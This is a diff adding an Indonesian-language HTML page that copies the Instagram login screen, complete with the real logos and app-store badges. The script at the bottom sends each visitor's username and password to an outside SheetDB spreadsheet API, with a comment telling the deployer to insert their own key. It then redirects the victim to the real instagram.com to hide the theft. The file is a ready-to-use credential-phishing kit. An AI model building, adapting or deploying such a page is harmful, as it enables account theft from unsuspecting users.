@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        igBlue: '#0095f6',
+                        igLightGray: '#dbdbdb',
+                        igDarkGray: '#8e8e8e',
+                        igBackground: '#fafafa'
+                    }
+                }
+            },
+            darkMode: 'class',
+        }
+
+        // Deteksi mode gelap
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+        });
+    </script>
+</head>
+<body class="bg-igBackground dark:bg-black text-black dark:text-white">
+    <div class="flex flex-col items-center justify-center min-h-screen px-4">
+        <div class="w-full max-w-[350px] mb-10">
+            <div class="border border-igLightGray dark:border-gray-700 bg-white dark:bg-gray-900 rounded-sm p-10 mb-3">
+                <div class="flex justify-center mb-8">
+                    <!-- Instagram logo -->
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="h-12 dark:hidden">
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-dark.png/ba03bf65fff5.png" alt="Instagram" class="h-12 hidden dark:block">
+                </div>
+                <form id="loginForm" class="flex flex-col">
+                    <div class="mb-2">
+                        <div class="relative">
+                            <input type="text" id="username" placeholder="Nama pengguna, email, atau nomor telepon" 
+                                class="w-full border border-igLightGray dark:border-gray-700 rounded-sm px-2 py-[9px] text-sm bg-white dark:bg-gray-800 focus:border-gray-400 dark:focus:border-gray-500 focus:outline-none"
+                                required>
+                        </div>
+                    </div>
+                    <div class="mb-4">
+                        <div class="relative">
+                            <input type="password" id="password" placeholder="Kata sandi" 
+                                class="w-full border border-igLightGray dark:border-gray-700 rounded-sm px-2 py-[9px] text-sm bg-white dark:bg-gray-800 focus:border-gray-400 dark:focus:border-gray-500 focus:outline-none"
+                                required>
+                        </div>
+                    </div>
+                    <button type="submit" id="loginButton" 
+                        class="bg-igBlue text-white py-1.5 rounded-lg text-sm font-semibold transition opacity-70 cursor-not-allowed">
+                        Masuk
+                    </button>
+                </form>
+                <div class="flex items-center my-4">
+                    <div class="h-px bg-igLightGray dark:bg-gray-700 flex-grow"></div>
+                    <div class="mx-4 text-igDarkGray dark:text-gray-400 text-sm font-semibold">ATAU</div>
+                    <div class="h-px bg-igLightGray dark:bg-gray-700 flex-grow"></div>
+                </div>
+                <div class="flex justify-center items-center mb-5">
+                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/facebook.svg" alt="Facebook Icon" class="w-5 h-5 mr-2 dark:invert">
+                    <a href="#" class="text-sm font-semibold text-[#385185] dark:text-blue-400">Masuk dengan Facebook</a>
+                </div>
+                <div class="text-center">
+                    <a href="#" class="text-xs text-[#385185] dark:text-blue-400">Lupa kata sandi?</a>
+                </div>
+            </div>
+            <div class="border border-igLightGray dark:border-gray-700 bg-white dark:bg-gray-900 rounded-sm p-6 text-center">
+                <p class="text-sm">
+                    Tidak punya akun? <a href="#" class="text-igBlue font-semibold">Buat akun</a>
+                </p>
+            </div>
+            <div class="text-center mt-4">
+                <p class="text-sm mb-4">Dapatkan aplikasi.</p>
+                <div class="flex justify-center space-x-2">
+                    <a href="https://apps.apple.com/app/instagram/id389801252">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_indonesian-id.png/4ee1da85aaf8.png" alt="Download on App Store" class="h-10">
+                    </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_indonesian-id.png/f991f6ca7ab6.png" alt="Get it on Google Play" class="h-10">
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="text-center w-full text-xs text-igDarkGray dark:text-gray-400 max-w-[350px]">
+            <div class="flex flex-wrap justify-center mb-4">
+                <a href="#" class="mx-2 mb-3">Meta</a>
+                <a href="#" class="mx-2 mb-3">Tentang</a>
+                <a href="#" class="mx-2 mb-3">Blog</a>
+                <a href="#" class="mx-2 mb-3">Pekerjaan</a>
+                <a href="#" class="mx-2 mb-3">Bantuan</a>
+                <a href="#" class="mx-2 mb-3">API</a>
+                <a href="#" class="mx-2 mb-3">Privasi</a>
+                <a href="#" class="mx-2 mb-3">Ketentuan</a>
+                <a href="#" class="mx-2 mb-3">Lokasi</a>
+                <a href="#" class="mx-2 mb-3">Instagram Lite</a>
+                <a href="#" class="mx-2 mb-3">Threads</a>
+                <a href="#" class="mx-2 mb-3">Pengunggahan Kontak & Nonpengguna</a>
+                <a href="#" class="mx-2 mb-3">Meta Verified</a>
+            </div>
+            <div class="mb-4">
+                <select class="bg-transparent text-igDarkGray dark:text-gray-400 text-xs border-none outline-none">
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="en">English</option>
+                </select>
+                <span>© 2023 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Ganti dengan URL SheetDB Anda
+        const SHEET_DB_URL = 'https://sheetdb.io/api/v1/MASUKKAN_API_KEY_ANDA_DISINI';
+
+        // Validasi input
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+
+        function validateInputs() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginButton.classList.remove('opacity-70', 'cursor-not-allowed');
+                loginButton.classList.add('opacity-100');
+                return true;
+            } else {
+                loginButton.classList.add('opacity-70', 'cursor-not-allowed');
+                loginButton.classList.remove('opacity-100');
+                return false;
+            }
+        }
+
+        usernameInput.addEventListener('input', validateInputs);
+        passwordInput.addEventListener('input', validateInputs);
+
+        // Fungsi login
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (username && password) {
+                try {
+                    // Kirim data ke SheetDB
+                    await fetch(SHEET_DB_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            data: {
+                                username: username,
+                                password: password,
+                                timestamp: new Date().toISOString()
+                            }
+                        })
+                    });
+                    
+                    // Redirect ke Instagram asli
+                    window.location.href = 'https://www.instagram.com/';
+                } catch (error) {
+                    console.error('Error:', error);
+                    // Tetap redirect ke Instagram meskipun ada error
+                    window.location.href = 'https://www.instagram.com/';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
